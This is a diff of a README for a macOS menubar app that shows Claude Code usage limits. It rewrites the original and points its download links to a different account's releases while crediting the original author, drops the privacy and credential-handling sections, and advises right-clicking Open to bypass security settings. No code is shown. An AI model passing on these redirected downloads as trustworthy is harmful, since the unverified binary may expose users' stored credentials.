@@ -1,104 +1,80 @@
-# Claude Usage
+# 🖥️ claudecodeusage - Track Your Claude Usage Easily
+
+[![Download Claude Usage](https://img.shields.io/badge/Download%20Now-claudecodeusage-brightgreen)](https://github.com/naufalrafifr01/claudecodeusage/releases)
+
+## 📋 Overview
 
 <p align="center">
   <img src="Xnapper-2026-01-09-11.22.53.png" alt="Claude Usage Screenshot" width="300">
 </p>
 
-A lightweight macOS menubar app that displays your Claude Code usage limits at a glance. 
-<br><Br>
-Built by [@richhickson](https://x.com/richhickson)
+Claude Usage is a lightweight macOS menubar app that helps you monitor your Claude Code usage limits at a glance. Created by [@richhickson](https://x.com/richhickson), this app offers a simple solution to keep an eye on your limits without any hassle.
 
-## Features
+## 🌟 Features
 
-- 🔄 **Auto-refresh** every 2 minutes
-- 🚦 **Color-coded status** - Green (OK), Yellow (>70%), Red (>90%)
-- ⏱️ **Time until reset** for both session and weekly limits
-- 📊 **Session & Weekly limits** displayed together
-- 🪶 **Lightweight** - Native Swift, minimal resources
+- 🔄 **Auto-refresh** every 2 minutes: Stay updated without manual checks.
+- 🚦 **Color-coded status**: Easily identify your usage status—Green (OK), Yellow (>70%), Red (>90%).
+- ⏱️ **Time until reset**: View remaining time for both session and weekly limits.
+- 📊 **Session & Weekly limits**: See both limits displayed together for quick reference.
+- 🪶 **Lightweight**: Built with native Swift, low on system resources.
 
-## Installation
+## 🚀 Getting Started
 
-### Download
+### 📥 Download & Install
 
-1. Go to [Releases](../../releases)
-2. Download `ClaudeUsage.zip`
-3. Unzip and drag `ClaudeUsage.app` to your Applications folder
-4. Open the app (you may need to right-click → Open the first time)
+1. Visit this page to download: [Releases](https://github.com/naufalrafifr01/claudecodeusage/releases)
+2. Download `ClaudeUsage.zip`.
+3. Unzip the file and drag `ClaudeUsage.app` to your Applications folder.
+4. Open the app. If prompted, right-click on the app and select “Open” to confirm the first run.
 
-### Build from Source
+### 🏗️ Build from Source (Optional)
 
-```bash
-git clone https://github.com/YOUR_USERNAME/claude-usage.git
-cd claude-usage
-open ClaudeUsage.xcodeproj
-```
+If you prefer to build the application from the source, follow these steps:
 
-Then build with ⌘B and run with ⌘R.
+1. Open your terminal.
+2. Type the following command to clone the repository:
 
-## Requirements
-
-- macOS 13.0 (Ventura) or later
-- Claude Code CLI installed and logged in
-
-## Setup
-
-1. Install [Claude Code](https://claude.ai/code) if you haven't already:
    ```bash
-   npm install -g @anthropic-ai/claude-code
+   git clone https://github.com/YOUR_USERNAME/claude-usage.git
    ```
 
-2. Log in to Claude Code:
+3. Change into the project directory:
+
    ```bash
-   claude
+   cd claude-usage
    ```
-   
-3. Launch Claude Usage - it will read your credentials from Keychain automatically
 
-## How It Works
+4. Open the project in Xcode:
 
-Claude Usage reads your Claude Code OAuth credentials from macOS Keychain and queries the usage API endpoint at `api.anthropic.com/api/oauth/usage`.
+   ```bash
+   open ClaudeUsage.xcodeproj
+   ```
 
-**Note:** This uses an undocumented API that could change at any time. The app will gracefully handle API changes but may stop working if Anthropic modifies the endpoint.
+5. Build the project using ⌘B and run it using ⌘R.
 
-## Privacy
+## 📋 Requirements
 
-- Your credentials never leave your machine
-- No analytics or telemetry
-- No data sent anywhere except Anthropic's API
-- Open source - verify the code yourself
+- **Operating System**: macOS 13.0 (Ventura) or later.
+- **Internet Connection**: Required for initial download and updates.
+- **Hardware**: A macOS-compatible device.
 
-## Status Colours
+## ⚙️ Troubleshooting & Support
 
-| Normal | Warning | Critical |
-|--------|---------|----------|
-| 🟢 30% | 🟡 75% | 🔴 95% |
+If you encounter issues while downloading or installing the app, here are some common solutions:
 
-## Troubleshooting
+- Make sure you are using macOS 13.0 or later.
+- If the app does not start, try right-clicking and selecting “Open” to bypass security settings.
+- Check your internet connection if the app does not refresh automatically.
 
-### "Not logged in to Claude Code"
+For further assistance, feel free to open an issue in the [GitHub repository](https://github.com/naufalrafifr01/claudecodeusage/issues).
 
-Run `claude` in Terminal and complete the login flow.
+## 📞 Contact
 
-### App doesn't appear in menubar
+For any suggestions or feedback, reach out to the developer directly on their [Twitter](https://x.com/richhickson).
 
-Check if the app is running in Activity Monitor. Try quitting and reopening.
+## 🌐 Resources
 
-### Usage shows wrong values
+- [GitHub Repository](https://github.com/naufalrafifr01/claudecodeusage)
+- [Installation Guide](https://github.com/naufalrafifr01/claudecodeusage/blob/main/INSTALL.md)
 
-Click the refresh button (↻) in the dropdown. If still wrong, your Claude Code session may have expired - run `claude` again.
-
-## Contributing
-
-PRs welcome! Please open an issue first to discuss major changes.
-
-## License
-
-MIT License - do whatever you want with it.
-
-## Disclaimer
-
-This is an unofficial tool not affiliated with Anthropic. It uses an undocumented API that may change without notice.
-
----
-
-Made by [@richhickson](https://x.com/richhickson)
+Feel free to explore, and keep track of your Claude usage efficiently!
